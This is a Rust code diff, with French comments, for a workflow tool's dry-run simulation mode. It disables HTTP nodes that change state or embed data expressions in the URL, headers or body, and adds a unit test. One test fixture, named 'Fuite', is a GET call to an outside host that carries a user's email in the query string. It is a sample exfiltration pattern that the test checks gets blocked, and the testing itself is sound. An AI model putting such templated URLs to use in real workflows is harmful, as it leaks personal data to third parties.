@@ -64,7 +64,8 @@ seuls les workflows inactifs peuvent être modifiés."
     }
 }
 
-/// Simulation : neutralise (désactive) les nœuds qui agissent hors de mini8n. Un nœud
+/// Simulation : neutralise (désactive) les nœuds qui agissent hors de mini8n ou peuvent
+/// y envoyer des données. Un nœud
 /// désactivé transmet son entrée telle quelle : la suite du workflow s'exécute.
 fn simulate(def: &mut Value) -> Vec<String> {
     const SENDS: [&str; 7] = [
@@ -89,8 +90,14 @@ fn simulate(def: &mut Value) -> Vec<String> {
             text("/data/params/method"),
             text("/data/name"),
         );
+        // Appel HTTP : neutralisé s'il modifie quelque chose (méthode autre que GET) ou s'il
+        // peut transmettre des données lues (expressions dans l'URL, les en-têtes ou le corps).
+        let templated = ["url", "headers", "body"]
+            .iter()
+            .any(|k| text(&format!("/data/params/{k}")).contains("{{"));
         let sends = SENDS.contains(&kind.as_str())
-            || (kind == "http" && !method.is_empty() && !method.eq_ignore_ascii_case("GET"));
+            || (kind == "http"
+                && (templated || (!method.is_empty() && !method.eq_ignore_ascii_case("GET"))));
         let disabled = n
             .pointer("/data/disabled")
             .and_then(Value::as_bool)
@@ -1102,6 +1109,20 @@ mod tests {
             "edges": [{"source": "a", "target": "b"}]
         });
         assert_eq!(planned(&def, Some("b")), ["a", "b"]);
+
+        let mut sim = json!({"nodes": [
+            {"id": "m", "data": {"kind": "email_send", "name": "Envoi", "params": {}}},
+            {"id": "g", "data": {"kind": "http", "name": "Lecture", "params": {"method": "GET", "url": "https://api.exemple.test/x"}}},
+            {"id": "x", "data": {"kind": "http", "name": "Fuite", "params": {"method": "GET", "url": "https://autre.test/?d={{ $json.email }}"}}},
+            {"id": "p", "data": {"kind": "http", "name": "Écriture", "params": {"method": "POST", "url": "https://api.exemple.test/x"}}},
+            {"id": "f", "data": {"kind": "filter", "name": "Filtre", "params": {}}}
+        ]});
+        assert_eq!(simulate(&mut sim), ["Envoi", "Fuite", "Écriture"]);
+        assert_eq!(
+            sim["nodes"][1]["data"].get("disabled"),
+            None,
+            "GET statique conservé"
+        );
         assert_eq!(planned(&def, None).len(), 3);
         assert_eq!(
             shorten(json!("x".repeat(600)))
